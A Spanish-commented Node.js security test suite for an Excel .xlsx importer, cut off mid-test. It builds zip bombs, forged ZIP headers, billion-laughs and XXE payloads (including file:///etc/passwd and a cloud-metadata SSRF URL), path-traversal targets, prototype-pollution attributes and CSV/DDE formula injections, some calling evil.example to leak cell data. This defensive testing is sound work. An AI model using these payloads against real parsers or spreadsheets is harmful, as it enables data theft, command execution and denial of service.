// V-07 — Pruebas de seguridad de la importación de mediciones desde Excel .xlsx
// (engine/zip.js, engine/xml.js, engine/xlsx.js, src/lib/inflate.js y la vista
// src/views/custodian/measurements.js). Todos los archivos maliciosos se fabrican
// aquí, en memoria, con un armador de ZIP propio de la prueba (independiente del
// del desarrollador) que permite mentir en cada campo del formato.
//
// Categorías: 3 (entradas: zip bombs, ZIP manipulado, XML con DOCTYPE/ENTITY,
// billion laughs, XXE, anidamiento, ReDoS, __proto__, rutas de relaciones,
// fórmulas e inyección CSV, XSS en mensajes), 4 (front: sin innerHTML, descarga
// de la plantilla por blob: propio frente a la CSP), 1 (la importación no abre
// una vía nueva de escritura: mismas filas validadas y mismo insert con RLS),
// 6 (sin dependencias nuevas, sin red en el lector).
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { deflateRawSync } from 'node:zlib';
import {
  parseMeasurementsXlsx, readFirstSheet, parseXml, XmlError, resolvePartPath, listZipEntries, readZipEntry,
  buildXlsxTemplate, crc32, XLSX_MAX_PART_BYTES, XLSX_MAX_TOTAL_BYTES, XML_MAX_DEPTH, CSV_MAX_ROWS,
} from '../../engine/index.js';
import { inflateRaw } from '../../src/lib/inflate.js';

const read = (p) => readFileSync(fileURLToPath(new URL(p, import.meta.url)), 'utf8');
const enc = new TextEncoder();
const NS = 'http://schemas.openxmlformats.org/spreadsheetml/2006/main';
const REL = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships';
const PREL = 'http://schemas.openxmlformats.org/package/2006/relationships';
const UNITS = [{ id: 'u-alfa', name: 'Unidad Alfa' }, { id: 'u-beta', name: 'Unidad Beta' }];
const AVAIL = { measurementType: 'window_average', direction: 'higher_is_better', thresholds: { green: 99.9, yellow: 99.5 } };
const OBS = { measurementType: 'coverage', direction: 'higher_is_better', thresholds: { green: 90, yellow: 75 } };
const VULN = {
  measurementType: 'cumulative_target', direction: 'higher_is_better', thresholds: { green: 85, yellow: 70 },
  thresholdsByCategory: { P0P1: { green: 96, yellow: 90 }, P2P3: { green: 85, yellow: 75 } },
};
const CTX = { units: UNITS, today: '2027-02-15' };
const MiB = 1024 * 1024;

// ---------------------------------------------------------------------------
// Armador de ZIP hostil. Cada entrada: { name, data, method?, size?, csize?,
// crc?, flags?, alias? (reutiliza los datos locales de otra entrada) }.
// Opciones globales: { total?, disk?, cdOffset?, cdSize?, extraCentral? }.
// ---------------------------------------------------------------------------
function hostileZip(entries, opts = {}) {
  const locals = [];
  const centrals = [];
  const offsets = new Map();
  let off = 0;
  for (const e of entries) {
    const nameBytes = enc.encode(e.name);
    const data = typeof e.data === 'string' ? enc.encode(e.data) : (e.data ?? new Uint8Array());
    const method = e.method ?? 8;
    const comp = e.raw ?? (method === 8 ? new Uint8Array(deflateRawSync(data)) : data);
    const crc = e.crc ?? crc32(data);
    const size = e.size ?? data.length;
    const csize = e.csize ?? comp.length;
    let localOffset;
    if (e.alias) {
      localOffset = offsets.get(e.alias).offset;
    } else {
      localOffset = off;
      const loc = Buffer.alloc(30);
      loc.writeUInt32LE(0x04034b50, 0); loc.writeUInt16LE(20, 4); loc.writeUInt16LE(e.flags ?? 0, 6);
      loc.writeUInt16LE(method, 8); loc.writeUInt32LE(crc, 14); loc.writeUInt32LE(csize, 18);
      loc.writeUInt32LE(size, 22); loc.writeUInt16LE(nameBytes.length, 26);
      locals.push(loc, nameBytes, comp);
      off += 30 + nameBytes.length + comp.length;
      offsets.set(e.name, { offset: localOffset });
    }
    const c = Buffer.alloc(46);
    c.writeUInt32LE(0x02014b50, 0); c.writeUInt16LE(20, 4); c.writeUInt16LE(20, 6);
    c.writeUInt16LE(e.flags ?? 0, 8); c.writeUInt16LE(method, 10); c.writeUInt32LE(crc, 16);
    c.writeUInt32LE(e.alias && e.csize === undefined ? entries.find((x) => x.name === e.alias)._csize : csize, 20);
    c.writeUInt32LE(size, 24); c.writeUInt16LE(nameBytes.length, 28);
    c.writeUInt32LE(e.localOffset ?? localOffset, 42);
    centrals.push(c, nameBytes);
    e._csize = csize;
  }
  const cd = Buffer.concat(centrals);
  const n = opts.total ?? entries.length;
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(opts.disk ?? 0, 4);
  eocd.writeUInt16LE(n, 8); eocd.writeUInt16LE(n, 10);
  eocd.writeUInt32LE(opts.cdSize ?? cd.length, 12);
  eocd.writeUInt32LE(opts.cdOffset ?? off, 16);
  return new Uint8Array(Buffer.concat([...locals, cd, eocd]));
}

const rootRels = (target = 'xl/workbook.xml', mode = '') => `<Relationships xmlns="${PREL}"><Relationship Id="rId1" Type="${REL}/officeDocument" Target="${target}"${mode}/></Relationships>`;
const workbook = (extra = '') => `<workbook xmlns="${NS}" xmlns:r="${REL}">${extra}<sheets><sheet name="M" sheetId="1" r:id="rId1"/></sheets></workbook>`;
const wbRels = (sheetTarget = 'worksheets/sheet1.xml', { mode = '', ss = 'sharedStrings.xml', ssMode = '' } = {}) => `<Relationships xmlns="${PREL}">`
  + `<Relationship Id="rId1" Type="${REL}/worksheet" Target="${sheetTarget}"${mode}/>`
  + (ss ? `<Relationship Id="rId9" Type="${REL}/sharedStrings" Target="${ss}"${ssMode}/>` : '')
  + '</Relationships>';
const xesc = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/"/g, '&quot;');
/** Hoja con celdas inlineStr / numéricas; `raw` inserta XML tal cual. */
function sheet(rows) {
  const body = rows.map((cells, r) => `<row r="${r + 1}">${cells.map((v) => {
    if (v && typeof v === 'object' && 'raw' in v) return v.raw;
    if (typeof v === 'number') return `<c><v>${v}</v></c>`;
    return `<c t="inlineStr"><is><t>${xesc(v)}</t></is></c>`;
  }).join('')}</row>`).join('');
  return `<worksheet xmlns="${NS}"><sheetData>${body}</sheetData></worksheet>`;
}
const VALID_ROWS = [['fecha', 'unidad', 'valor'], ['2027-01-10', 'Unidad Alfa', 99.95]];
/** Libro estándar; `over` reemplaza o añade partes (valor null = quitar). */
function book(over = {}, opts = {}) {
  const parts = {
    '[Content_Types].xml': '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>',
    '_rels/.rels': rootRels(),
    'xl/workbook.xml': workbook(),
    'xl/_rels/workbook.xml.rels': wbRels('worksheets/sheet1.xml', { ss: null }),
    'xl/worksheets/sheet1.xml': sheet(VALID_ROWS),
    ...over,
  };
  return hostileZip(Object.entries(parts).filter(([, v]) => v !== null).map(([name, data]) => (
    data && typeof data === 'object' && !(data instanceof Uint8Array) ? { name, ...data } : { name, data }
  )), opts);
}

/** inflateRaw real (DecompressionStream) con contadores de bytes y llamadas. */
function spyInflate() {
  const s = { calls: 0, out: 0, maxCap: 0 };
  s.fn = async (data, max) => {
    s.calls++;
    s.maxCap = Math.max(s.maxCap, max);
    const out = await inflateRaw(data, max);
    s.out += out.length;
    return out;
  };
  return s;
}

/** Ejecuta el import con red prohibida: cualquier fetch es un fallo. */
async function run(bytes, indicator = AVAIL, inflate = inflateRaw) {
  const realFetch = globalThis.fetch;
  const fetched = [];
  globalThis.fetch = async (u) => { fetched.push(String(u)); throw new Error('red prohibida'); };
  try {
    const t0 = Date.now();
    const res = await parseMeasurementsXlsx(bytes, indicator, CTX, inflate);
    return { ...res, ms: Date.now() - t0, fetched };
  } finally {
    globalThis.fetch = realFetch;
  }
}
const rejected = (res, re) => {
  assert.equal(res.rows.length, 0, 'no debe quedar ninguna fila para guardar');
  assert.ok(res.errors.length > 0, 'debe haber errores');
  assert.deepEqual(res.fetched, [], 'el lector no hace peticiones de red');
  if (re) assert.match(res.errors.map((e) => e.message).join(' | '), re);
};
const protoClean = () => {
  for (const k of ['polluted', 'r', 't', 'Id', 'Target', 'TargetMode', 'isAdmin']) assert.equal(Object.prototype[k], undefined, k);
  assert.equal({}.polluted, undefined);
};

test('control: el libro base se importa con una fila válida (las demás pruebas parten de aquí)', async () => {
  const res = await run(book());
  assert.deepEqual(res.errors, []);
  assert.equal(res.rows.length, 1);
  assert.equal(res.rows[0].unitId, 'u-alfa');
});

// ---------------------------------------------------------------------------
// Categoría 3 · Zip bombs y topes de descompresión
// ---------------------------------------------------------------------------

test('cat 3: zip bomb con tamaño declarado FALSO (100 MiB reales, 2 KB declarados) se corta en el tope sin descomprimirla entera', async () => {
  const bomb = new Uint8Array(100 * MiB); // ceros: ~100 KB comprimidos, cabe en el límite de 1 MB
  const s = spyInflate();
  const bytes = book({ 'xl/worksheets/sheet1.xml': { data: bomb, size: 2048 } });
  assert.ok(bytes.length < 1024 * 1024, `el archivo hostil cabe en 1 MB (${bytes.length})`);
  const res = await run(bytes, AVAIL, s.fn);
  rejected(res, /demasiado grande/);
  assert.ok(s.maxCap <= XLSX_MAX_PART_BYTES, 'el tope pasado al descompresor no supera 8 MiB');
  assert.ok(s.out <= XLSX_MAX_TOTAL_BYTES, `bytes descomprimidos entregados ${s.out}`);
  assert.ok(res.ms < 10000, `tardó ${res.ms} ms`);
});

test('cat 3: inflateRaw corta la salida en cuanto supera maxBytes (bomba de 64 MiB con tope de 1 MiB)', async () => {
  const comp = new Uint8Array(deflateRawSync(new Uint8Array(64 * MiB)));
  await assert.rejects(() => inflateRaw(comp, 1 * MiB), (e) => e.code === 'limit');
});

test('cat 3: zip bomb con tamaño declarado honesto mayor que 8 MiB se rechaza ANTES de descomprimir', async () => {
  const s = spyInflate();
  const res = await run(book({ 'xl/worksheets/sheet1.xml': { data: new Uint8Array(9 * MiB) } }), AVAIL, s.fn);
  rejected(res, /demasiado grande/);
  // Se leyeron rels y workbook (pequeños); la hoja no llegó a descomprimirse.
  assert.ok(s.out < 64 * 1024, `bytes descomprimidos ${s.out}`);
});

test('cat 3: el tope total de 20 MiB se aplica entre partes (cuatro partes de casi 8 MiB)', async () => {
  const pad = (xml) => xml.replace('><', `>${' '.repeat(XLSX_MAX_PART_BYTES - xml.length - 16)}<`);
  const s = spyInflate();
  const res = await run(book({
    '_rels/.rels': pad(rootRels()),
    'xl/workbook.xml': pad(workbook()),
    'xl/_rels/workbook.xml.rels': pad(wbRels()),
    'xl/sharedStrings.xml': pad(`<sst xmlns="${NS}"><si><t>x</t></si></sst>`),
  }), AVAIL, s.fn);
  rejected(res, /demasiado grande/);
  assert.ok(s.out <= XLSX_MAX_TOTAL_BYTES, `total descomprimido ${s.out} > 20 MiB`);
});

test('cat 3: bomba no recursiva (entradas superpuestas que apuntan a los mismos datos) no evade el tope total', async () => {
  const big = `<sst xmlns="${NS}">${' '.repeat(7 * MiB)}<si><t>x</t></si></sst>`;
  const s = spyInflate();
  // sharedStrings, la hoja y los rels del libro comparten los mismos datos comprimidos.
  const bytes = hostileZip([
    { name: '_rels/.rels', data: rootRels() },
    { name: 'xl/workbook.xml', data: workbook() },
    { name: 'xl/sharedStrings.xml', data: big },
    { name: 'xl/_rels/workbook.xml.rels', alias: 'xl/sharedStrings.xml', data: big },
    { name: 'xl/worksheets/sheet1.xml', alias: 'xl/sharedStrings.xml', data: big },
    // 990 entradas más sobre los mismos datos: el lector solo abre las partes que necesita.
    ...Array.from({ length: 990 }, (_, i) => ({ name: `xl/media/p${i}.xml`, alias: 'xl/sharedStrings.xml', data: big })),
  ]);
  assert.ok(bytes.length < 1024 * 1024, `cabe en 1 MB (${bytes.length})`);
  const res = await run(bytes, AVAIL, s.fn);
  rejected(res, /estructura inesperada|demasiado grande/);
  assert.ok(s.calls <= 5, `partes descomprimidas ${s.calls} (máximo 5: .rels, workbook, rels, sharedStrings, hoja)`);
  assert.ok(s.out <= XLSX_MAX_TOTAL_BYTES, `total descomprimido ${s.out}`);
});

test('cat 3: una parte de 8 MiB exactos de XML denso no bloquea (tope de elementos) y se responde en tiempo acotado', async () => {
  const cells = '<c/>'.repeat(Math.floor((XLSX_MAX_PART_BYTES - 200) / 4));
  const res = await run(book({ 'xl/worksheets/sheet1.xml': `<worksheet xmlns="${NS}"><sheetData><row r="1">${cells}</row></sheetData></worksheet>` }));
  rejected(res);
  assert.ok(res.ms < 15000, `tardó ${res.ms} ms`);
});

// ---------------------------------------------------------------------------
// Categoría 3 · ZIP manipulado
// ---------------------------------------------------------------------------

const zipCases = [
  ['ZIP64 (tamaños 0xFFFFFFFF)', () => book({ 'xl/worksheets/sheet1.xml': { data: sheet(VALID_ROWS), size: 0xffffffff } }), /ZIP64/],
  ['ZIP64 (offset 0xFFFFFFFF en el EOCD)', () => book({}, { cdOffset: 0xffffffff }), /ZIP64/],
  ['ZIP64 (0xFFFF entradas)', () => book({}, { total: 0xffff }), /ZIP64/],
  ['cifrado tradicional (bit 0)', () => book({ 'xl/worksheets/sheet1.xml': { data: sheet(VALID_ROWS), flags: 1 } }), /cifrado|contraseña/],
  ['método 99 (AES de WinZip)', () => book({ 'xl/worksheets/sheet1.xml': { data: sheet(VALID_ROWS), method: 99, raw: enc.encode('x') } }), /compresión no soportada/],
  ['método 12 (bzip2)', () => book({ 'xl/worksheets/sheet1.xml': { data: sheet(VALID_ROWS), method: 12, raw: enc.encode('x') } }), /compresión no soportada/],
  ['ZIP en varias partes (disco 1)', () => book({}, { disk: 1 }), /varias partes/],
  ['más de 1000 entradas', () => hostileZip(Array.from({ length: 1001 }, (_, i) => ({ name: `p${i}`, data: '', method: 0 }))), /demasiadas partes/],
  ['directorio central fuera de rango', () => book({}, { cdOffset: 0x7fffffff }), /dañado/],
  ['cabecera local fuera del archivo', () => book({ 'xl/worksheets/sheet1.xml': { data: sheet(VALID_ROWS), localOffset: 0x7ffffff0 } }), /dañado/],
  ['tamaño comprimido que se sale del archivo', () => book({ 'xl/worksheets/sheet1.xml': { data: sheet(VALID_ROWS), csize: 0x7fffffff } }), /dañado/],
  ['CRC-32 incorrecto', () => book({ 'xl/worksheets/sheet1.xml': { data: sheet(VALID_ROWS), crc: 0xdeadbeef } }), /CRC/],
  ['sin comprimir con tamaño declarado distinto', () => book({ 'xl/worksheets/sheet1.xml': { data: sheet(VALID_ROWS), method: 0, size: 5 } }), /dañado/],
  ['deflate con tamaño declarado menor que el real (contrabando)', () => book({ 'xl/worksheets/sheet1.xml': { data: sheet(VALID_ROWS), size: 40 } }), /dañado/],
  ['deflate truncado / basura', () => book({ 'xl/worksheets/sheet1.xml': { data: sheet(VALID_ROWS), raw: new Uint8Array([0xff, 0xff, 0xff, 0x00, 0x13]) } }), /dañado/],
  ['partes repetidas (dos hojas con el mismo nombre)', () => hostileZip([
    { name: '_rels/.rels', data: rootRels() }, { name: 'xl/workbook.xml', data: workbook() },
    { name: 'xl/_rels/workbook.xml.rels', data: wbRels('worksheets/sheet1.xml', { ss: null }) },
    { name: 'xl/worksheets/sheet1.xml', data: sheet(VALID_ROWS) }, { name: 'xl/worksheets/sheet1.xml', data: sheet([['=1']]) },
  ]), /repetidas/],
  ['archivo OLE (.xls antiguo o protegido)', () => new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1, ...new Uint8Array(600)]), /\.xls|contraseña/],
  ['firma PK pero truncado a 10 bytes', () => book().slice(0, 10), /dañado|válido/],
  ['solo cabecera PK\\x03\\x04', () => new Uint8Array([0x50, 0x4b, 0x03, 0x04]), /dañado|válido/],
  ['más de 1 MB', () => new Uint8Array(1024 * 1024 + 1).fill(0x50), /1 MB|válido/],
  ['bytes que no son ZIP', () => enc.encode('fecha,unidad,valor\n2027-01-10,Unidad Alfa,=1+1'), /válido/],
];
for (const [name, make, re] of zipCases) {
  test(`cat 3: ZIP manipulado — ${name} → rechazado con mensaje claro`, async () => {
    rejected(await run(make()), re);
  });
}

test('cat 3: fuzzing — 600 mutaciones deterministas de un .xlsx válido nunca lanzan, nunca cuelgan ni dejan filas a medias', async () => {
  const base = book();
  let seed = 0x5eed;
  const rnd = () => { seed = (seed * 1103515245 + 12345) & 0x7fffffff; return seed; };
  for (let k = 0; k < 600; k++) {
    const m = base.slice();
    const flips = 1 + (rnd() % 8);
    for (let f = 0; f < flips; f++) m[rnd() % m.length] = rnd() & 0xff;
    const res = await run(m);
    assert.ok(Array.isArray(res.rows) && Array.isArray(res.errors), `mutación ${k}`);
    assert.ok(res.rows.length === 0 || res.errors.length === 0, `mutación ${k}: filas y errores a la vez`);
    for (const r of res.rows) assert.ok(['u-alfa', 'u-beta'].includes(r.unitId), `mutación ${k}: unidad ajena ${r.unitId}`);
    assert.ok(res.ms < 5000, `mutación ${k} tardó ${res.ms} ms`);
  }
  protoClean();
});

test('cat 3: listZipEntries/readZipEntry rechazan entradas que no son bytes y no confían en inflate ajeno', async () => {
  assert.throws(() => listZipEntries('PK'), /dañado/);
  const bytes = book();
  const entry = listZipEntries(bytes).get('xl/worksheets/sheet1.xml');
  // Un descompresor que ignora el tope y devuelve más de lo permitido.
  const liar = async () => new Uint8Array(XLSX_MAX_PART_BYTES + 1);
  await assert.rejects(() => readZipEntry(bytes, entry, liar, XLSX_MAX_PART_BYTES), /demasiado grande/);
  const notBytes = async () => 'texto';
  await assert.rejects(() => readZipEntry(bytes, entry, notBytes, XLSX_MAX_PART_BYTES), /dañado/);
});

// ---------------------------------------------------------------------------
// Categoría 3 · XML hostil (DOCTYPE, entidades, XXE, anidamiento, ReDoS)
// ---------------------------------------------------------------------------

const LAUGHS = '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">'
  + Array.from({ length: 9 }, (_, i) => `<!ENTITY lol${i + 1} "${`&lol${i ? i : ''};`.repeat(10)}">`).join('')
  + `]><worksheet xmlns="${NS}"><sheetData><row r="1"><c t="inlineStr"><is><t>&lol9;</t></is></c></row></sheetData></worksheet>`;
const xmlAttacks = [
  ['billion laughs', LAUGHS],
  ['XXE (SYSTEM file:///etc/passwd)', `<!DOCTYPE w [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><worksheet xmlns="${NS}"><sheetData><row><c t="inlineStr"><is><t>&xxe;</t></is></c></row></sheetData></worksheet>`],
  ['XXE por URL (SSRF)', `<!DOCTYPE w [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><worksheet xmlns="${NS}"><sheetData><row><c t="inlineStr"><is><t>&xxe;</t></is></c></row></sheetData></worksheet>`],
  ['entidad de parámetro externa', `<!DOCTYPE w [<!ENTITY % ext SYSTEM "http://evil.example/x.dtd"> %ext;]><worksheet xmlns="${NS}"/>`],
  ['DOCTYPE con DTD externo', `<!DOCTYPE worksheet SYSTEM "http://evil.example/w.dtd"><worksheet xmlns="${NS}"/>`],
  ['DOCTYPE en minúsculas tras comentario', `<!-- x --><!doctype w><worksheet xmlns="${NS}"/>`],
  ['<!ENTITY> dentro del elemento raíz', `<worksheet xmlns="${NS}"><!ENTITY a "b"><sheetData/></worksheet>`],
  ['entidad no declarada (&xxe;)', `<worksheet xmlns="${NS}"><sheetData><row><c t="inlineStr"><is><t>&xxe;</t></is></c></row></sheetData></worksheet>`],
  ['XInclude', `<worksheet xmlns="${NS}" xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/><sheetData><row><c t="inlineStr"><is><t>&amp;xi;</t></is></c></row></sheetData></worksheet>`],
];
for (const [name, xml] of xmlAttacks) {
  test(`cat 3: XML hostil en la hoja — ${name} → rechazado o inerte, sin red ni expansión`, async () => {
    const res = await run(book({ 'xl/worksheets/sheet1.xml': xml }));
    rejected(res);
    assert.ok(res.ms < 2000, `tardó ${res.ms} ms`);
    assert.doesNotMatch(JSON.stringify(res.errors), /root:|lollollol/);
  });
}

for (const part of ['_rels/.rels', 'xl/workbook.xml', 'xl/_rels/workbook.xml.rels', 'xl/sharedStrings.xml']) {
  test(`cat 3: billion laughs y XXE en ${part} se rechazan igual`, async () => {
    for (const xml of [LAUGHS, `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>`]) {
      const over = { [part]: xml };
      if (part === 'xl/sharedStrings.xml') over['xl/_rels/workbook.xml.rels'] = wbRels();
      rejected(await run(book(over)));
    }
  });
}

test('cat 3: anidamiento extremo (100 000 niveles) no desborda la pila', () => {
  const deep = `${'<a>'.repeat(100000)}${'</a>'.repeat(100000)}`;
  assert.throws(() => parseXml(deep), (e) => e instanceof XmlError && /anidamiento/.test(e.message));
  assert.throws(() => parseXml(`${'<a>'.repeat(XML_MAX_DEPTH + 1)}${'</a>'.repeat(XML_MAX_DEPTH + 1)}`), XmlError);
});

const REDOS = [
  ['atributo de 4 MiB sin cerrar', `<a b="${'x'.repeat(4 * MiB)}`],
  ['nombre de atributo de 4 MiB sin "="', `<a ${'b'.repeat(4 * MiB)}>`],
  ['4 MiB de "&" sin ";"', `<a>${'&'.repeat(4 * MiB)}</a>`],
  ['"&#" repetido', `<a>${'&#'.repeat(2 * MiB)}</a>`],
  ['4 MiB de "<" sueltos', `<a>${'<'.repeat(4 * MiB)}</a>`],
  ['comentario sin cerrar de 4 MiB', `<a><!--${'-'.repeat(4 * MiB)}`],
  ['CDATA sin cerrar de 4 MiB', `<a><![CDATA[${']'.repeat(4 * MiB)}`],
  ['espacios entre atributos (4 MiB)', `<a${' '.repeat(4 * MiB)}b="1"${' '.repeat(10)}c`],
  ['"_x" de escapes OOXML a medias', `<a>${'_x00'.repeat(MiB)}</a>`],
  ['200 000 atributos distintos', `<a ${Array.from({ length: 200000 }, (_, i) => `a${i}="1"`).join(' ')}/>`],
  ['texto enorme válido (4 MiB)', `<a>${'x'.repeat(4 * MiB)}</a>`],
];
for (const [name, xml] of REDOS) {
  test(`cat 3: rendimiento / ReDoS — ${name} termina en tiempo lineal`, () => {
    const t0 = Date.now();
    try { parseXml(xml); } catch (e) { assert.ok(e instanceof XmlError, e.message); }
    assert.ok(Date.now() - t0 < 3000, `tardó ${Date.now() - t0} ms`);
  });
}

test('cat 3: atributos __proto__, constructor y prototype no contaminan Object.prototype', async () => {
  const doc = parseXml('<a __proto__="x" constructor="y" prototype="z"><b __proto__="q"/></a>');
  const a = doc.children[0];
  assert.equal(Object.getPrototypeOf(a.attrs), null);
  assert.equal(a.attrs.__proto__, 'x');
  protoClean();
  // En las partes reales: Relationship con Id="__proto__" y celdas con atributos hostiles.
  const res = await run(book({
    'xl/_rels/workbook.xml.rels': `<Relationships xmlns="${PREL}"><Relationship Id="__proto__" Type="${REL}/worksheet" Target="worksheets/sheet1.xml"/><Relationship Id="rId1" Type="${REL}/worksheet" Target="worksheets/sheet1.xml" __proto__="polluted"/></Relationships>`,
    'xl/worksheets/sheet1.xml': sheet([['fecha', 'unidad', 'valor'], ['2027-01-10', { raw: '<c t="inlineStr" __proto__="1" constructor="2"><is><t>Unidad Alfa</t></is></c>' }, 99.95]]),
  }));
  assert.deepEqual(res.errors, []);
  protoClean();
});

test('cat 3: nombres de unidad __proto__, constructor, toString no resuelven a ninguna unidad', async () => {
  for (const u of ['__proto__', 'constructor', 'toString', 'hasOwnProperty']) {
    rejected(await run(book({ 'xl/worksheets/sheet1.xml': sheet([['fecha', 'unidad', 'valor'], ['2027-01-10', u, 99.95]]) })), /no existe/);
  }
  protoClean();
});

test('cat 3: referencias numéricas inválidas (&#0;, sustitutos, > U+10FFFF) se rechazan', () => {
  for (const r of ['&#0;', '&#xD800;', '&#x110000;', '&#99999999;', '&#x;', '&#-1;']) {
    assert.throws(() => parseXml(`<a>${r}</a>`), XmlError, r);
  }
});

// ---------------------------------------------------------------------------
// Categoría 3 · Rutas de relaciones (path traversal, absolutas, externas)
// ---------------------------------------------------------------------------

test('cat 3: resolvePartPath no sale de la raíz del paquete con ".."', () => {
  assert.equal(resolvePartPath('xl/', '../../etc/passwd'), null);
  assert.equal(resolvePartPath('xl/', '../../../x'), null);
  assert.equal(resolvePartPath('', '../x'), null);
  assert.equal(resolvePartPath('xl/', '/../x'), null);
  assert.equal(resolvePartPath('xl/', '/xl/worksheets/sheet1.xml'), 'xl/worksheets/sheet1.xml');
  assert.equal(resolvePartPath('xl/', 'worksheets/../worksheets/./sheet1.xml'), 'xl/worksheets/sheet1.xml');
});

const relCases = [
  ['hoja con TargetMode="External" a http', wbRels('http://evil.example/sheet.xml', { mode: ' TargetMode="External"', ss: null }), /no es una hoja/],
  ['hoja con TargetMode="External" a file:', wbRels('file:///etc/passwd', { mode: ' TargetMode="External"', ss: null }), /no es una hoja/],
  ['hoja externa que imita una ruta interna', wbRels('worksheets/sheet1.xml', { mode: ' TargetMode="External"', ss: null }), /no es una hoja/],
  ['hoja con ../../ fuera del paquete', wbRels('../../../../etc/passwd', { ss: null }), /falta una parte/],
  ['hoja con URL http sin TargetMode', wbRels('http://evil.example/sheet.xml', { ss: null }), /falta una parte/],
  ['hoja con ruta UNC / backslashes', wbRels('\\\\evil.example\\share\\s.xml', { ss: null }), /falta una parte/],
  ['primera hoja de tipo chartsheet', `<Relationships xmlns="${PREL}"><Relationship Id="rId1" Type="${REL}/chartsheet" Target="worksheets/sheet1.xml"/></Relationships>`, /no es una hoja/],
];
for (const [name, rels, re] of relCases) {
  test(`cat 3: relaciones — ${name} → rechazado sin red`, async () => {
    rejected(await run(book({ 'xl/_rels/workbook.xml.rels': rels })), re);
  });
}

test('cat 3: sharedStrings externo o fuera del paquete se ignora (sin red) y la hoja que lo usa falla cerrada', async () => {
  const usesShared = `<worksheet xmlns="${NS}"><sheetData><row r="1"><c t="s"><v>0</v></c></row></sheetData></worksheet>`;
  for (const ss of [
    wbRels('worksheets/sheet1.xml', { ss: 'http://evil.example/ss.xml', ssMode: ' TargetMode="External"' }),
    wbRels('worksheets/sheet1.xml', { ss: '../../../ss.xml' }),
  ]) {
    rejected(await run(book({ 'xl/_rels/workbook.xml.rels': ss, 'xl/worksheets/sheet1.xml': usesShared })), /texto compartido inexistente/);
  }
});

test('cat 3: officeDocument externo en _rels/.rels no se sigue; officeDocument con ".." cae a la ruta estándar', async () => {
  const s1 = await run(book({ '_rels/.rels': rootRels('http://evil.example/wb.xml', ' TargetMode="External"') }));
  assert.deepEqual(s1.errors, []); // usa xl/workbook.xml, nunca la URL
  assert.deepEqual(s1.fetched, []);
  const s2 = await run(book({ '_rels/.rels': rootRels('../../../../etc/passwd') }));
  assert.deepEqual(s2.errors, []);
});

test('cat 3: ruta de hoja apuntando a otra parte del paquete (p. ej. los propios .rels) se analiza como hoja y falla cerrada', async () => {
  rejected(await run(book({ 'xl/_rels/workbook.xml.rels': wbRels('_rels/workbook.xml.rels', { ss: null }) })), /estructura inesperada/);
});

// ---------------------------------------------------------------------------
// Categoría 3 · Fórmulas e inyección CSV/DDE a través del Excel
// ---------------------------------------------------------------------------

const FORMULA_TEXTS = [
  '=HYPERLINK("https://evil.example/?d="&A1,"ver")',
  "+cmd|' /C calc'!A0",
  '@SUM(1+1)*cmd|" /C calc"!A0',
  '-2+3+cmd|" /C calc"!A0',
  '=WEBSERVICE("http://evil.example/")',
  '\t=1+1',
  '\r=1+1',
  ' =1+1',
];
for (const f of FORMULA_TEXTS) {
  for (const [col, indicator, rows] of [
    ['unidad', AVAIL, (v) => [['fecha', 'unidad', 'valor'], ['2027-01-10', v, 99.95]]],
    ['valor', AVAIL, (v) => [['fecha', 'unidad', 'valor'], ['2027-01-10', 'Unidad Alfa', v]]],
    ['app_id', OBS, (v) => [['fecha', 'unidad', 'app_id', 'cumple'], ['2027-01-10', 'Unidad Alfa', v, 'si']]],
    ['categoria', VULN, (v) => [['fecha', 'unidad', 'valor', 'categoria', 'tipo'], ['2027-01-10', 'Unidad Alfa', 5, v, 'resueltas']]],
  ]) {
    test(`cat 3: texto con fórmula ${JSON.stringify(f)} en ${col} (inlineStr) → rechazado`, async () => {
      rejected(await run(book({ 'xl/worksheets/sheet1.xml': sheet(rows(f)) }), indicator), /fórmula/);
    });
  }
}

test('cat 3: la fórmula llega por todas las vías de texto del .xlsx (compartido, str, CDATA, entidad, escape _x003D_, rich text)', async () => {
  const variants = {
    shared: { ss: `<sst xmlns="${NS}"><si><t>=1+1</t></si></sst>`, cell: '<c t="s"><v>0</v></c>' },
    richShared: { ss: `<sst xmlns="${NS}"><si><r><t>=</t></r><r><t>cmd|' /C calc'!A0</t></r></si></sst>`, cell: '<c t="s"><v>0</v></c>' },
    str: { cell: '<c t="str"><v>=1+1</v></c>' },
    cdata: { cell: '<c t="inlineStr"><is><t><![CDATA[=1+1]]></t></is></c>' },
    entity: { cell: '<c t="inlineStr"><is><t>&#61;1+1</t></is></c>' },
    hexEntity: { cell: '<c t="inlineStr"><is><t>&#x40;SUM(1)</t></is></c>' },
    ooxmlEscape: { cell: '<c t="inlineStr"><is><t>_x003D_1+1</t></is></c>' },
    ooxmlTab: { cell: '<c t="inlineStr"><is><t>_x0009_=1+1</t></is></c>' },
    dateType: { cell: '<c t="d"><v>=1+1</v></c>' },
    numberType: { cell: '<c><v>-1</v></c>' },
  };
  for (const [name, v] of Object.entries(variants)) {
    const over = {
      'xl/worksheets/sheet1.xml': sheet([['fecha', 'unidad', 'valor'], ['2027-01-10', { raw: v.cell }, 99.95]]),
    };
    if (v.ss) { over['xl/sharedStrings.xml'] = v.ss; over['xl/_rels/workbook.xml.rels'] = wbRels(); }
    rejected(await run(book(over)), /fórmula|no existe/);
    const res = await run(book(over));
    assert.ok(res.errors.some((e) => /fórmula/.test(e.message)), `${name}: ${JSON.stringify(res.errors)}`);
  }
});

test('cat 3: una celda con <f> se rechaza aunque su valor cacheado sea válido (no se usa el resultado)', async () => {
  for (const f of ['1+1', 'HYPERLINK("http://evil.example")', 'WEBSERVICE("http://evil.example")', '[1]Hoja!A1']) {
    const res = await run(book({
      'xl/worksheets/sheet1.xml': sheet([['fecha', 'unidad', 'valor'], ['2027-01-10', 'Unidad Alfa', { raw: `<c><f>${xesc(f)}</f><v>99.95</v></c>` }]]),
